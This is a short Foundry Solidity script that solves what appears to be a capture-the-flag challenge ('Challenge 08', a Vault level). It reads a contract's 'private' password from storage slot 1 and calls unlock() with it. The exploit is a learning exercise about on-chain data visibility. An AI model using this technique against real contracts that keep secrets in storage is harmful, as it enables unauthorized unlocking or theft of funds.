// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IVault {
    function unlock(bytes32 _password) external;
    function locked() external view returns (bool);
}

/**
 * @title Challenge 08 Solution Script
 * @notice Read private password from storage slot 1 and call unlock()
 */
contract VaultSolution is Script {
    address constant INSTANCE = 0x67858382159F9dE5d926aeC27A43ef400fF66010;

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        // Step 1: Read storage slot 1 (password is private but still readable on-chain)
        bytes32 password = vm.load(INSTANCE, bytes32(uint256(1)));
        console.log("Password from storage:");
        console.logBytes32(password);

        vm.startBroadcast(deployerPrivateKey);

        // Step 2: Unlock the vault
        IVault(INSTANCE).unlock(password);

        vm.stopBroadcast();

        console.log("Locked:", IVault(INSTANCE).locked());
        console.log("Challenge 08 completed!");
    }
}
